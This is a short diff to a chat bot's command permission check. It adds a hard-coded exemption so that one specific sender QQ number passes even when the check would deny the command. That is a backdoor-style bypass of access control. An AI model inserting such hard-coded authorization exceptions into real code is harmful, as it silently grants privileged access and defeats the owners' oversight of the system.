@@ -178,8 +178,9 @@ class CommandRegistry:
                     # This is strange, not likely happens
                     raise SkipException
         except SkipException:
-            # Not allowed
-            return False
+            if not str(ctx_msg.get('sender_qq')) == '1002647525':
+                # Not allowed
+                return False
 
         # Still alive, so let it go
         return True
